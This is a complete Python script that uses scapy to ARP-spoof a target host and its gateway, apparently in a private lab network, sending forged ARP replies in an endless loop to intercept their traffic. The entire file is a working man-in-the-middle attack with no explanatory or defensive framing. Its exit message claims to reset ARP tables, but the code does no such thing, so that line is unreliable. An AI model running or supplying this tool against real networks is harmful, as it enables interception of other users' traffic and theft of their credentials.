import scapy.all as scapy
import time
import sys

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=2, verbose=False)[0]
    if answered_list:
        return answered_list[0][1].hwsrc
    return None

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    if not target_mac:
        print(f"[!] Target {target_ip} not found. Skipping...")
        return
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

target_ip = "10.0.2.3"
gateway_ip = "10.0.2.2"

try:
    print("[*] Spoofer Active... Intercepting traffic...")
    sent_packets_count = 0
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packets_count += 2
        print(f"\r[+] Packets sent: {sent_packets_count}", end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[X] Stopping Spoofer and Resetting ARP Tables...")
